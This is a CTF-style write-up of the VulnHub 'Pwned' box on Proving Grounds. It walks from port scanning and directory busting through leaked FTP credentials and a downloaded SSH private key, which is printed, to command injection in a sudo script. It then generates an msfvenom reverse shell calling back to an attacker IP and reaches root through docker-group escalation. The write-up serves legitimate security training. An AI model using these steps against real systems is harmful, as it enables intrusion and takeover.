---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/pwned-1,507/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We are starting with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.214.95
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 07:12 CEST
Nmap scan report for 192.168.214.95
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.17 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.214.95/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.214.95/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/08/07 07:15:02 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 3065]
/index.html           (Status: 200) [Size: 3065]
/robots.txt           (Status: 200) [Size: 61]
/robots.txt           (Status: 200) [Size: 61]
/server-status        (Status: 403) [Size: 279]
Progress: 18419 / 18460 (99.78%)
===============================================================
2023/08/07 07:16:41 Finished
===============================================================
```

Analysing `robots.txt` content.
```http
GET /robots.txt HTTP/1.1
Host: 192.168.214.95
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
Date: Mon, 07 Aug 2023 05:20:33 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Tue, 08 Sep 2020 19:44:29 GMT
ETag: "3d-5aed2903c1cea"
Accept-Ranges: bytes
Content-Length: 61
Connection: close
Content-Type: text/plain

# Group 1

User-agent: *
Allow: /nothing
Allow: /hidden_text
```

`/nothing` contains a file named `/nothing/nothing.html`.  
  
> `nothing.html` does not seem to be useful.
{: .prompt-danger }

`/hidden_text` contains `/hidden_text/secret.dic`.  
Content of `secret.dic`
```
/hacked
/vanakam_nanba
/hackerman.gif 
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg 
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```

> The content looks like a word list useful for dir busting.
{: .prompt-info }

## dir busting... again
```bash
$ gobuster dir -k -u http://192.168.214.95/ -w secret.dic -t 5 -x txt,html,php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.214.95/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/08/07 07:22:22 Starting gobuster in directory enumeration mode
===============================================================
/pwned.vuln           (Status: 301) [Size: 321] [--> http://192.168.214.95/pwned.vuln/]
Progress: 76 / 88 (86.36%)
===============================================================
2023/08/07 07:22:23 Finished
===============================================================
```

Lets have a look at the identified resource `/pwned.vuln/`.
```http
GET /pwned.vuln/ HTTP/1.1
Host: 192.168.182.95
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
Date: Mon, 07 Aug 2023 19:30:04 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Tue, 08 Sep 2020 19:52:22 GMT
ETag: "2a1-5aed2ac6ec651-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 673
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>
<head> 
	<title>login</title>
</head>
<body>
		<div id="main">
			<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
			<form method="POST">
			Username <input type="text" name="username" class="text" autocomplete="off" required>
			Password <input type="password" name="password" class="text" required>
			<input type="submit" name="submit" id="sub">
			</form>
			</div>
</body>
</html>




<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

> The source code reveal some credentials: `ftpuser:B0ss_Pr!ncesS`
{: .prompt-info }

---

# exploitation
## ftp access
Checking if the identified credentials work on the `ftp` service of the target.
```bash
$ ftp 192.168.182.95       
Connected to 192.168.182.95.
220 (vsFTPd 3.0.3)
Name (192.168.182.95:void): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

> Yes! We got access.
{: .prompt-info }

Lets have a look what is available.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||55767|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||60680|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||9834|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |***********************************************************************************************************************************************************************************************|  2602      316.79 KiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (66.76 KiB/s)
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||19458|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |***********************************************************************************************************************************************************************************************|    75       91.78 KiB/s    00:00 ETA
226 Transfer complete.
75 bytes received in 00:00 (1.96 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
$ cat note.txt 

Wow you are here 

ariana won't happy about this note 

sorry ariana :(

$ cat id_rsa                              
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

> We have a `ssh` key and probably a user named `ariana`!
{: .prompt-info }

Lets check if we can login via `ssh` using this information.
```bash
$ ssh -i id_rsa ariana@192.168.182.95 
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

> Yes we have `ssh` access!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
ariana@pwned:~$ ls
ariana-personal.diary  local.txt  user1.txt
ariana@pwned:~$ cat local.txt 
5******************************3
```

## privilege escalation
Checking `sudo` privileges
```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

> We are allowed to execute `/home/messenger.sh` as user `selena`.
{: .prompt-info }

Lets check the content of this file.
```bash
ariana@pwned:~$ cat /home/messenger.sh
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```

> The line `$msg 2> /dev/null` is vulnerable.
{: .prompt-info }

That means that we can inject commands when executing the script exploiting the message parameter.
  
Checking if the idea works.
```bash
$ sudo -u selena /home/messenger.sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : ariana

Enter message for ariana :whoami

Sending message to ariana 
selena

Message sent to ariana :)
```

> Yes it does! Our `whoami` command got executed.
{: .prompt-info }

Lets generate a simple reverse shell we place on the target and then execute with the script to get a shell as user `selena`.
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.186 LPORT=80 -f elf > revshell
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

$ scp -i id_rsa revshell ariana@192.168.182.95:/tmp/revshell

ariana@pwned:~$ chmod +x /tmp/revshell
```

Start a listener on the attacker machine.
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Now back on the target machine we execute the vulnerable script again and trigger our reverse shell.
```bash
$ sudo -u selena /home/messenger.sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : ariana

Enter message for ariana :/tmp/revshell

Sending message to ariana 
```

Catch connection from target.
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.182.95: inverse host lookup failed: Unknown host
connect to [192.168.45.186] from (UNKNOWN) [192.168.182.95] 42936
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

> Yes we are `selena` now! And we see we are in the `docker` group
{: .prompt-info }

This usually allows us to escalate to `root`. Lets use `gtfobins` to escalate.
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.182.95: inverse host lookup failed: Unknown host
connect to [192.168.45.186] from (UNKNOWN) [192.168.182.95] 42936
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
the input device is not a TTY
```

> We need a `TTY` first...
{: .prompt-info }

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$ export TERM=xterm
export TERM=xterm
selena@pwned:/home/ariana$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

> Yes! We are `root`
{: .prompt-info }

## get second flag
```bash
# cd /root
cd /root
# ls
ls
proof.txt  root.txt
# cat proof.txt
cat proof.txt
a******************************8
```

Pwned! <@:-)
